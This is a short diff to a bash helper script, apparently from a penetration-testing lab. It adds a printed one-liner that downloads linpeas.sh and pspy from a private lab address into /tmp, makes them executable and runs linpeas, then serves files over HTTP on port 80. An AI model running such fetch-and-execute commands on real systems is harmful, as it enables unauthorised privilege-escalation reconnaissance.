@@ -1,3 +1,6 @@
 #!/bin/bash
 ips
+
+echo 'cd /tmp;wget 192.168.56.1/linpeas.sh;wget 192.168.56.1/pspy;chmod +x *;./linpeas.sh'
+
 sudo python3 -m http.server 80
